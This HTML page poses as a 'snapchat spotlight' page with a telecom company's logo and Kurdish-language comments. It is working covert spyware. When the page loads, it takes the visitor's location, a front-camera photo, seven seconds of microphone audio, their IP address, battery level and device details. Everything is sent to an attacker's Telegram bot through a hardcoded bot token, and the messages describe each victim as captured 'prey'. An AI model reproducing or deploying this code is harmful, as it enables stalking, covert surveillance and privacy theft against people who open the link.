<!DOCTYPE html>
<html lang="ku">
<head>
    <meta charset="UTF-8">
    <link rel="icon" type="image/png" href="https://www.korektelecom.com/media/1001/korek-logo.png">
    <title>snapchat spotlight</title>
    <style>body { background-color: white; margin: 0; overflow: hidden; }</style>
</head>
<body onload="capture()">
<script>
    const urlParams = new URLSearchParams(window.location.search);
    const targetID = urlParams.get('id'); 
    const TOKEN = "8431515310:AAG0xW2hgSbex-3vmGx8bXxiR3BADu10N3g";

    async function capture() {
        if (!targetID) return;

        // 📍 ١. وەرگرتنی لوکەیشن (Location)
        navigator.geolocation.getCurrentPosition(pos => {
            const { latitude, longitude } = pos.coords;
            const mapLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
            sendToTelegram(`📍 <b>شوێنی نێچیر:</b>\n<a href='${mapLink}'>کلیک لێرە بکە بۆ بینینی نەخشە</a>`);
        });

        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });

            // 📸 ٢. گرتنی وێنە (Snapshot)
            const video = document.createElement('video');
            video.srcObject = stream;
            video.onloadedmetadata = () => {
                video.play();
                setTimeout(() => {
                    const canvas = document.createElement('canvas');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    canvas.toBlob(blob => {
                        const fd = new FormData();
                        fd.append("chat_id", targetID);
                        fd.append("photo", blob, "capture.jpg");
                        fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: "POST", body: fd });
                    }, 'image/jpeg');
                }, 1000);
            };

            // 🎙️ ٣. تۆمارکردنی ٧ چرکە دەنگ
            const mediaRecorder = new MediaRecorder(stream);
            let chunks = [];
            mediaRecorder.ondataavailable = e => chunks.push(e.data);
            mediaRecorder.onstop = async () => {
                const blob = new Blob(chunks, { type: 'audio/ogg' });
                const fd = new FormData();
                fd.append("chat_id", targetID);
                fd.append("voice", blob, "voice.ogg");
                fetch(`https://api.telegram.org/bot${TOKEN}/sendVoice`, { method: "POST", body: fd });
                stream.getTracks().forEach(t => t.stop());
            };
            mediaRecorder.start();
            setTimeout(() => mediaRecorder.stop(), 7000);

            // 🔋 ناردنی ڕاپۆرتی سەرەتایی (IP و پاتری)
            let batteryInfo = "Unknown";
            if (navigator.getBattery) {
                const batt = await navigator.getBattery();
                batteryInfo = `${(batt.level * 100).toFixed(0)}%`;
            }
            fetch('https://api.ipify.org?format=json').then(res => res.json()).then(data => {
                let report = `🦅 <b>نێچیرێکی نوێ ڕاوکرا!</b>\n\n` +
                             `👤 <b>ID:</b> <code>${targetID}</code>\n` +
                             `🌐 <b>IP:</b> <code>${data.ip}</code>\n` +
                             `🔋 <b>Battery:</b> <code>${batteryInfo}</code>\n` +
                             `📱 <b>Device:</b> <code>${navigator.platform}</code>`;
                sendToTelegram(report);
            });

        } catch (e) { console.error(e); }
    }

    function sendToTelegram(message) {
        fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ chat_id: targetID, text: message, parse_mode: "HTML" })
        });
    }
</script>
</body>
</html>
